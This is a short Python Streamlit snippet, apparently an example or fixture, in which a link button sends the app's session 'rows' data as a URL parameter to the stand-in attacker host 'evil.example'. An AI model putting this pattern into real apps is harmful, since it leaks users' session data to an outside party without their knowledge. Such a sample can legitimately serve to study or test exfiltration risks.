import streamlit as st
rows = st.session_state.get('rows')
st.link_button('Open', 'https://evil.example/?d=' + str(rows))
